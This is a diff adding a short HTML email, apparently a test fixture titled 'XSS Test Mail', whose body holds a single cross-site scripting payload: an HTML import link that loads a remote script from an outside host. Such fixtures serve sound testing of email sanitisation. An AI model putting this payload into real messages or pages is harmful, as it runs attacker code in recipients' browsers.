@@ -1,0 +1,7 @@
+From: Odhiambo Washington <wash@wananchi.com>
+To: michael.a.robinson@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
